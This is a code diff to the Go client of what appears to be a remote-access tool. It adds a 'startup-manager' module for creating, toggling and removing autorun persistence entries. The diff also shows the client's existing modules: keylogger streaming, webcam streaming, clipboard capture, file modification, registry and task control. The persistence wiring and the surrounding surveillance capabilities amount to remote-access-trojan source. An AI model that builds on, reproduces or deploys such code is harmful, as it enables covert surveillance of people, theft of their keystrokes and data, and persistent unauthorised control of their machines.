@@ -22,6 +22,7 @@ import (
         clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
         filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
         registrymgr "github.com/rootbay/tenvy-client/internal/modules/management/registry"
+        startupmgr "github.com/rootbay/tenvy-client/internal/modules/management/startup"
         taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
         tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
@@ -270,9 +271,10 @@ func newDefaultModuleManager() *moduleManager {
 	registry.register(newAudioModule())
 	registry.register(newKeyloggerModule())
 	registry.register(newWebcamModule())
-	registry.register(newClipboardModule())
+        registry.register(newClipboardModule())
         registry.register(newFileManagerModule())
         registry.register(newRegistryModule())
+        registry.register(newStartupModule())
         registry.register(newTaskManagerModule())
 	registry.register(newTCPConnectionsModule())
 	registry.register(newClientChatModule())
@@ -1616,8 +1618,8 @@ var (
 	keyloggerModuleBaseCapabilities      = []string{"keylogger.stream", "keylogger.batch"}
 	webcamModuleBaseCapabilities         = []string{"webcam.enumerate", "webcam.stream"}
 	clipboardModuleBaseCapabilities      = []string{"clipboard.capture", "clipboard.push"}
-	fileManagerModuleBaseCapabilities    = []string{"file-manager.explore", "file-manager.modify"}
-	taskManagerModuleBaseCapabilities    = []string{"task-manager.list", "task-manager.control"}
+        fileManagerModuleBaseCapabilities    = []string{"file-manager.explore", "file-manager.modify"}
+        taskManagerModuleBaseCapabilities    = []string{"task-manager.list", "task-manager.control"}
 	tcpConnectionsModuleBaseCapabilities = []string{"tcp-connections.enumerate", "tcp-connections.control"}
 	clientChatModuleBaseCapabilities     = []string{"client-chat.persistent", "client-chat.alias"}
 	systemInfoModuleBaseCapabilities     = []string{"system-info.snapshot", "system-info.telemetry"}
@@ -2300,10 +2302,76 @@ func (m *registryModule) Shutdown(context.Context) error {
         return nil
 }
 
+type startupModule struct {
+        manager *startupmgr.Manager
+}
+
+func newStartupModule() Module {
+        return &startupModule{}
+}
+
+func (m *startupModule) Metadata() ModuleMetadata {
+        return ModuleMetadata{
+                ID:          "startup-manager",
+                Title:       "Startup Manager",
+                Description: "Enumerate and manage autorun persistence entries.",
+                Commands:    []string{"startup-manager"},
+                Capabilities: []ModuleCapability{
+                        {
+                                ID:          "startup.enumerate",
+                                Name:        "startup.enumerate",
+                                Description: "Enumerate autorun entries and associated telemetry.",
+                        },
+                        {
+                                ID:          "startup.manage",
+                                Name:        "startup.manage",
+                                Description: "Create, toggle, and remove autorun entries across scopes.",
+                        },
+                },
+        }
+}
+
+func (m *startupModule) ID() string {
+        return "startup-manager"
+}
+
+func (m *startupModule) Init(_ context.Context, cfg Config) error {
+        return m.configure(cfg)
+}
+
+func (m *startupModule) UpdateConfig(cfg Config) error {
+        return m.configure(cfg)
+}
+
+func (m *startupModule) configure(cfg Config) error {
+        if m.manager == nil {
+                m.manager = startupmgr.NewManager(cfg.Logger)
+                return nil
+        }
+        m.manager.UpdateLogger(cfg.Logger)
+        return nil
+}
+
+func (m *startupModule) Handle(ctx context.Context, cmd protocol.Command) error {
+        if m.manager == nil {
+                return WrapCommandResult(protocol.CommandResult{
+                        CommandID:   cmd.ID,
+                        Success:     false,
+                        Error:       "startup subsystem not initialized",
+                        CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+                })
+        }
+        return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *startupModule) Shutdown(context.Context) error {
+        return nil
+}
+
 type taskManagerModule struct {
-	manager    *taskmanager.Manager
-	extensions *moduleExtensionState
-	extOnce    sync.Once
+        manager    *taskmanager.Manager
+        extensions *moduleExtensionState
+        extOnce    sync.Once
 }
 
 func (m *taskManagerModule) Metadata() ModuleMetadata {
